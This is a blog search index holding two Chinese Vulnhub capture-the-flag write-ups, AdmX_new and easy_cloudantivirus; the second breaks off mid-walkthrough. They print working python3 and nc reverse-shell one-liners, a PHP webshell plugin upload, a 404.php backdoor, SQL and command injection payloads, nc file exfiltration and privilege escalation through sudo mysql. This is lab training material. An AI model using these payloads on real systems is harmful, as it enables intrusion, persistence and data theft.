<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vulnhub靶机之AdmX_new</title>
      <link href="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/"/>
      <url>/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/</url>
      
        <content type="html"><![CDATA[<p>主机发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.31.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220414054305795.png" alt="image-20220414054305795"></p><p>端口扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.31.45</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412053503800.png" alt="image-20220412053503800"></p><p>服务版本扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p80 192.168.31.34</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412053542916.png" alt="image-20220412053542916"></p><p>访问web，Apache2默认页面</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412053703605.png" alt="image-20220412053703605"></p><p>扫目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.31.45</span><br></pre></td></tr></table></figure><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412053939407.png" alt="image-20220412053939407" style="zoom:80%;"><p>访问wordpress发现部分文件未加载出来</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412055955244.png" alt="image-20220412055955244"></p><p>随便点击发现源地址都会由192.168.31.45跳转到192.168.159.145</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412054352179.png" alt="image-20220412054352179"></p><p>打开BP对网站进行爬取</p><p>当我们访问192.168.31.45时会强制访问到192.168.159.145加载资源，导致wordpress加载部分内容</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412060204209.png" alt="image-20220412060204209"></p><p>删除原始所有记录，将响应头、响应体里面所有192.168.159.145替换为192.168.31.45</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412055358255.png" alt="image-20220412055358255"></p><p>再次访问页面</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412055845828.png" alt="image-20220412055845828"></p><p>访问&#x2F;wordpress&#x2F;wp-login.php,尝试弱口令</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412060414614.png" alt="image-20220412060414614"></p><p>bp爆破</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412060536627.png" alt="image-20220412060536627"></p><p>top1000没跑出来</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412061349475.png" alt="image-20220412061349475" style="zoom: 80%;"><p>换个字典继续跑 SuperWordlist  MidPwds</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412061543283.png" alt="image-20220412061543283" style="zoom:67%;"><p>admin&#x2F;adam14成功登录后台</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412061835645.png" alt="image-20220412061835645"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wordpress后台拿shell方法</span><br><span class="line">1、media上传文件</span><br><span class="line">2、appearance——theme editor——404template</span><br><span class="line">3、插件——上传插件  shell.php 必须包含插件说明  压缩为zip 上传</span><br></pre></td></tr></table></figure><p>media上传文件</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412062112524.png" alt="image-20220412062112524"></p><p>白名单</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412062423462.png" alt="image-20220412062423462"></p><p>修改404template文件，不能更新</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412062801088.png" alt="image-20220412062801088"></p><p>上传插件</p><p>php一句话木马、php命令执行代码（插件描述不能少）</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220414065633918.png" alt="image-20220414065633918"></p><p>mz.php压缩为zip</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412063512516.png" alt="image-20220412063512516"></p><p>上传插件</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412063555748.png" alt="image-20220412063555748"></p><p>激活插件</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412064523797.png" alt="image-20220412064523797"></p><p>浏览器测试一句话 插件路径（&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;插件名）</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412064745400.png" alt="image-20220412064745400" style="zoom: 67%;"><p>蚁剑连接</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412064837066.png" alt="image-20220412064837066" style="zoom:67%;"><p>shell为www权限</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412065036244.png" alt="image-20220412065036244"></p><p>利用一句话python3反弹shell</p><p>存在python3</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220416112900536.png" alt="image-20220416112900536" style="zoom:80%;"><p>php一句话命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zz=system(&quot;id&quot;);</span><br><span class="line">zz=system(&#x27;id&#x27;);</span><br><span class="line">以上均能成功执行</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412071645438.png" alt="image-20220412071645438"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当输入命令带有&#x27;或&quot;如：</span><br><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.125&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line">无论使用zz=system(&quot;&quot;);还是zz=system(&#x27;&#x27;);都无法执行，因为system中的&#x27;或者&quot;都会与输入命令中的&#x27;或者&quot;提前闭合，导致命令不可用</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">解决方法</span><br><span class="line">使用反引号``</span><br><span class="line">zz=system(`python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.125&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;`)</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412071131153.png" alt="image-20220412071131153"></p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220412071204054.png" alt="image-20220412071204054"></p><p>python交互式shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413053204707.png" alt="image-20220413053204707"></p><p>命令执行反弹shell</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220414065925868.png" alt="image-20220414065925868"></p><p>python3反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.125&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220414070211169.png" alt="image-20220414070211169"></p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220414070233218.png" alt="image-20220414070233218"></p><p>msf获取shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">进入msf   msfconsole</span><br><span class="line">搜索相关模块search wordpress admin</span><br><span class="line">使用模块 use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class="line">查看参数 show options</span><br><span class="line">配置参数 set PASSWORD adam14</span><br><span class="line">           set rhosts 192.168.31.45</span><br><span class="line">           set targeturi /wordpress</span><br><span class="line">           set username admin</span><br><span class="line">执行  exploit / run</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220414071617875.png" alt="image-20220414071617875"></p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220414071639092.png" alt="image-20220414071639092"></p><p>升级shell为完全体shell（个人环境和目标环境必须是b shell）</p><p>修改攻击机环境为bsh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">检查    ls /bin/bash</span><br><span class="line">修改    chsh -s /bin/bash</span><br><span class="line">重启    reboot</span><br><span class="line">验证    echo $SHELL</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220415064404796.png" alt="image-20220415064404796"></p><p>当前shell（编辑不能移动光标、tab不能自动补全命令）</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220415062125002.png" alt="image-20220415062125002"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将会话放到后台ctrl + z</span><br><span class="line">配置    stty raw -echo</span><br><span class="line">将后台会话放到前台fg</span><br></pre></td></tr></table></figure><p>测试自动补全功能</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220415065022468.png" alt="image-20220415065022468"></p><p>目标机操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export $SHELL=/bin/bash</span><br><span class="line">export TERM=screen</span><br><span class="line">stty rows 38 columns 116</span><br><span class="line">reset</span><br></pre></td></tr></table></figure><p>添加后门</p><p>查看当前使用模板</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220415070918520.png" alt="image-20220415070918520" style="zoom:67%;"><p>在404配置文件中写入一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认路径     wp-content/themes/twentytwentyone/404.php</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220415065318122.png" alt="image-20220415065318122"></p><p>蚁剑连接</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220415070418694.png" alt="image-20220415070418694" style="zoom:80%;"><p>信息搜集</p><p>查看&#x2F;etc&#x2F;passwd发现可登录账号有root和wpadmin</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413053529613.png" alt="image-20220413053529613" style="zoom: 80%;"><p>wpadmin 家目录下发现local.txt，仅wpadmin有读权限</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413063231060.png" alt="image-20220413063231060"></p><p>www-data  —-&gt;  wpadmin  </p><p>查看内核版本信息，未找到可利用exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413063337022.png" alt="image-20220413063337022"></p><p>查看sudo规则，需要密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413063621357.png" alt="image-20220413063621357"></p><p>查找配置文件</p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413054346393.png" alt="image-20220413054346393" style="zoom:80%;"><p>使用admin登录数据库失败</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413054729637.png" alt="image-20220413054729637"></p><p>使用密码切换用户失败</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413064008108.png" alt="image-20220413064008108"></p><p>当前涉及到的账户密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">管理后台爆破：adminadam14</span><br><span class="line">wordpress配置文件：adminWp_Admin#123</span><br></pre></td></tr></table></figure><p>使用密码adam14成功切换</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413055655693.png" alt="image-20220413055655693"></p><p>获取flag</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413064119628.png" alt="image-20220413064119628"></p><p>wpadmin    —-&gt;    root</p><p>没有可利用的suid文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413060524349.png" alt="image-20220413060524349"></p><p>sudo -l 发现wpadmin可以以root权限执行&#x2F;usr&#x2F;bin&#x2F;mysql -u root -D wordpress -p</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413062825564.png" alt="image-20220413062825564"></p><p>成功以root权限进入数据库</p><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413062116450.png" alt="image-20220413062116450"></p><p>数据库内命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system id</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220416113541476.png" alt="image-20220416113541476"></p><p>获取root shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\! /bin/bash</span><br></pre></td></tr></table></figure><p><img src="/2022/04/12/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8BAdmX_new/image-20220413062242175.png" alt="image-20220413062242175"></p><p>总结</p><p>端口扫描开放80 —— 目录扫描发现wordpress —— 强制访问资源bp替换地址 —— 爆破进入后台 —— 安装插件getshell（一句话木马python3反弹shell、命令执行python3反弹shell、msf获取shell）—— 完全体交互式shell —— 利用爆破密码www-data切换为wpadmin —— 查看sudo规则以root权限免密进入数据库 —— 数据库内执行命令获取root shell</p><hr><p>菜鸡打靶，大佬勿喷。如有错误，欢迎斧正。</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机之easy_cloudantivirus</title>
      <link href="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/"/>
      <url>/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主机发现</span><br><span class="line">for i in $(seq 1 254); do arping -c 1 192.168.31.$i;done;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161258148.png" alt="image-20220315161258148"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">端口扫描</span><br><span class="line">nmap -p- 192.168.31.14</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161413290.png" alt="image-20220315161413290"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务扫描</span><br><span class="line">nmap -sV -p 22,8080 192.168.31.14</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161555269.png" alt="image-20220315161555269"></p><p>访问web8080</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315161645963.png" alt="image-20220315161645963"></p><p>需要输入验证码才能登录，两个思路：bp爆破和post注入</p><p>top1000跑一遍</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162142943.png" alt="image-20220315162142943"></p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162336861.png" alt="image-20220315162336861"></p><p>暴出密码为password</p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162432644.png" alt="image-20220315162432644" style="zoom:80%;"><p>password登录成功</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163338369.png" alt="image-20220315163338369"></p><p>测试一下sql注入</p><p>双引号报错</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315162826715.png" alt="image-20220315162826715"></p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163056812.png" alt="image-20220315163056812" style="zoom:80%;"><p>数据库为sqlite3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关键语句</span><br><span class="line">if len(c.execute(&#x27;select * from code where password=&quot;&#x27; + password + &#x27;&quot;&#x27;).fetchall()) &gt; 0:</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">构造闭合</span><br><span class="line">aaa&quot; or 1=1 --+</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163312634.png" alt="image-20220315163312634"></p><p>成功绕过密码</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163338369.png" alt="image-20220315163338369"></p><p>一个扫病毒的程序，输入文件名，就会对文件进行扫描</p><p>输入bash扫描结果</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315163636916.png" alt="image-20220315163636916"></p><p>构造多条命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.;分号，命令都会执行</span><br><span class="line">2.|管道符，前面执行的输出作为后面命令的输入  </span><br><span class="line">3.&amp;&amp;与，前面的命令执行成功，才会去执行后面的命令</span><br><span class="line">4.||或，前面的命令执行失败，才去执行后面的命令</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash;id</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315164509365.png" alt="image-20220315164509365"></p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315164534123.png" alt="image-20220315164534123"></p><p>能够执行命令，尝试反弹，目录中有python和netcat，可尝试python反弹、nc反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash|which nc</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315165142193.png" alt="image-20220315165142193"></p><p>本地监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure><p>nc反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash;nc 192.168.31.125 6666 -e /bin/bash</span><br></pre></td></tr></table></figure><p>执行命令后本地监听无反应</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315165826025.png" alt="image-20220315165826025"></p><p>nc基本都是禁用-e参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash;nc 192.168.31.125 6666 </span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315165730944.png" alt="image-20220315165730944"></p><p>nc串联</p><p>本地监听两个端口，一个用来传输命令，一个用来回显</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315170108855.png" alt="image-20220315170108855"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash | nc 192.168.31.125 12345 | /bin/bash | nc 192.168.31.125 54321</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315170719185.png" alt="image-20220315170719185"></p><p>ls发现存在database.sql文件</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315172531160.png" alt="image-20220315172531160"></p><p>查看文件详细信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file database.sql</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315172736565.png" alt="image-20220315172736565"></p><p>通过将文件从目标机传到本地,看一下数据库里有什么好东西</p><p>本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 5555 &gt; db.sql</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315173119896.png" alt="image-20220315173119896"></p><p>目标机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.31.125 5555 &lt; database.sql</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315174058726.png" alt="image-20220315174058726"></p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315174310559.png" alt="image-20220315174310559"></p><p>使用kali上的sqlite3查看db.sql文件</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315175300495.png" alt="image-20220315175300495"></p><p>code表只有一个字段password，之前有插入4条密码，而且目标主机开了22端口，可尝爆破</p><p>查看目标主机可登录账户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315180228062.png" alt="image-20220315180228062"></p><p>三个账户四条密码，做个字典跑一下</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315180617583.png" alt="image-20220315180617583"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P password.txt ssh://192.168.31.14</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315181043082.png" alt="image-20220315181043082"></p><p>没有成功，那就回到nc串联，想办法提权</p><p>找一下suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315181716791.png" alt="image-20220315181716791"></p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315181743441.png" alt="image-20220315181743441"></p><p>update_cloudav是由update_cloudav.c编译得到，文件所有这是root，u+s  文件运行的时候会以文件所有者的权限运行，也就是root权限</p><p>查看update_cloudav文件</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315182625865.png" alt="image-20220315182625865"></p><p>随便传了个参数</p><p><img src="/2022/03/15/Vulnhub%E9%9D%B6%E6%9C%BA%E4%B9%8Beasy_cloudantivirus/image-20220315183135386.png" alt="image-20220315183135386"></p><p>再来nc串联</p><p>本地监听</p><p><img 